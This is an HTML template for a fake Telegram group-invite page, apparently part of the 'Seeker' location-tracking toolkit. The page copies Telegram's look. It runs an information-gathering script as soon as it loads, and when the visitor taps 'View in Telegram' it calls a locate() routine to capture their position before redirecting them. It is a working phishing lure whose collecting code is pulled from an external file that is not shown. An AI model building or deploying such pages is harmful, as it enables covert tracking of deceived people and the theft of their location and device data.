<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #0088cc;
      color: #fff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .card {
      max-width: 360px;
      background: #fff;
      color: #000;
      border-radius: 12px;
      padding: 28px;
      text-align: center;
      box-shadow: 0 4px 24px rgba(0,0,0,0.2);
    }
    .telegram-icon { font-size: 3rem; margin-bottom: 16px; }
    h1 { font-size: 1.4rem; margin-bottom: 8px; color: #222; }
    p { color: #666; font-size: 0.95rem; line-height: 1.5; margin-bottom: 24px; }
    .btn {
      display: inline-block;
      padding: 14px 32px;
      background: #0088cc;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
    }
    .btn:hover { background: #007ab8; }
    #status { margin-top: 16px; font-size: 0.9rem; color: #666; }
  </style>
</head>
<body>
  <div class="card">
    <div class="telegram-icon">✈️</div>
    <h1>Join Group on Telegram</h1>
    <p>You've been invited to join a group. Tap to open in Telegram or continue in browser.</p>
    <button id="joinBtn" class="btn" onclick="handleJoin()">View in Telegram</button>
    <div id="status"></div>
  </div>
  <script>
    window.SEEKER_API_BASE = '{{ api_base }}';
  </script>
  <script src="/static/seeker/js/location.js"></script>
  <script>
    information();
    function handleJoin() {
      var btn = document.getElementById('joinBtn');
      var status = document.getElementById('status');
      btn.disabled = true;
      btn.textContent = 'Opening...';
      var redirectUrl = '{{ redirect_url }}' || 'https://telegram.org';
      locate(
        function() {
          status.textContent = 'Redirecting...';
          window.location.href = redirectUrl;
        },
        function(err, msg) {
          status.textContent = 'Unable to open. ' + (msg || '');
          btn.disabled = false;
          btn.textContent = 'View in Telegram';
        }
      );
    }
  </script>
</body>
</html>
